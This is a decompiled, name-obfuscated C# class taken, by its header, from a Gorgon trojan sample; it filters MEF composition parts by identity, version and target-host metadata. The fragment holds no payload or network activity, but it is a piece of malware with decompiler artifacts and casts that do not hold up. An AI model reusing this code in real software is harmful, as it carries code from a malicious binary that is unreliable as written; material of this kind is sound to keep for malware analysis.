// Decompiled with JetBrains decompiler
// Type: uDQZ9Kc.QShJ58q
// Assembly: gO77Fih, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: F43F05C3-DF79-4EF2-8C94-619BF1ED6D3E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-83f6c309f411e1aebbdf75c62f67f163231f1b0ee065936230741272cda1cb9a.exe

using kU6afx4;
using Microsoft.VisualStudio.Composition;
using System;
using System.Collections.Generic;
using System.Linq;

namespace uDQZ9Kc
{
  internal static class QShJ58q
  {
    private static readonly Version U0pr3BS = new Version();

    public static IEnumerable<ComposablePartDefinition> lvbsVIj(
      ComposableCatalog AUVaQ4t,
      string UbV1EJg)
    {
      // ISSUE: variable of a compiler-generated type
      QShJ58q.OByxbMp obyxbMp = (QShJ58q.OByxbMp) new YFDZWc8.IAssemblyCache();
      Dictionary<string, ComposablePartDefinition> dictionary = new Dictionary<string, ComposablePartDefinition>();
      ((YFDZWc8.\u0039JXx1pZ) obyxbMp).\u0033CTs0Rh = (ICollection<ComposablePartDefinition>) new HashSet<ComposablePartDefinition>();
      foreach (ComposablePartDefinition part in (IEnumerable<ComposablePartDefinition>) AUVaQ4t.Parts)
      {
        string str = part.gdxvIdo();
        if (!string.IsNullOrEmpty(str) && str != UbV1EJg)
        {
          ((YFDZWc8.\u0039JXx1pZ) obyxbMp).\u0033CTs0Rh.Add(part);
        }
        else
        {
          string key = part.jaLs5US();
          if (!string.IsNullOrEmpty(key))
          {
            ComposablePartDefinition composablePartDefinition;
            bool flag = dictionary.TryGetValue(key, out composablePartDefinition);
            if (!flag || part.gYwb24n(composablePartDefinition, UbV1EJg))
            {
              dictionary[key] = part;
              if (flag)
                ((YFDZWc8.\u0039JXx1pZ) obyxbMp).\u0033CTs0Rh.Add(composablePartDefinition);
            }
            else
              ((YFDZWc8.\u0039JXx1pZ) obyxbMp).\u0033CTs0Rh.Add(part);
          }
        }
      }
      // ISSUE: reference to a compiler-generated method
      return ((IEnumerable<ComposablePartDefinition>) AUVaQ4t.Parts).Where<ComposablePartDefinition>(new Func<ComposablePartDefinition, bool>(obyxbMp.\u0034iDqb0A));
    }

    private static bool gYwb24n(
      this ComposablePartDefinition F93KAKb,
      ComposablePartDefinition _param1,
      string nrxwgEv)
    {
      if (!string.IsNullOrEmpty(nrxwgEv))
      {
        if (F93KAKb.gdxvIdo() == nrxwgEv && _param1.gdxvIdo() != nrxwgEv)
          return true;
        if (_param1.gdxvIdo() == nrxwgEv && F93KAKb.gdxvIdo() != nrxwgEv)
          return false;
      }
      return F93KAKb.kypLmzt() > _param1.kypLmzt();
    }

    private static string jaLs5US(this ComposablePartDefinition wUtUPWl)
    {
      object obj = (object) null;
      wUtUPWl.Metadata.TryGetValue("System.ComponentModel.Composition.Caching.PartIdentity", out obj);
      return obj as string;
    }

    private static Version kypLmzt(this ComposablePartDefinition NnivJ0v)
    {
      object obj = (object) null;
      NnivJ0v.Metadata.TryGetValue("System.ComponentModel.Composition.Caching.PartVersion", out obj);
      string input = obj as string;
      Version result;
      if (string.IsNullOrEmpty(input) || !Version.TryParse(input, out result))
        result = QShJ58q.U0pr3BS;
      return result;
    }

    private static string gdxvIdo(this ComposablePartDefinition oonmQhW)
    {
      object obj = (object) null;
      oonmQhW.Metadata.TryGetValue("System.ComponentModel.Composition.Caching.PartTargetHost", out obj);
      return obj as string;
    }
  }
}
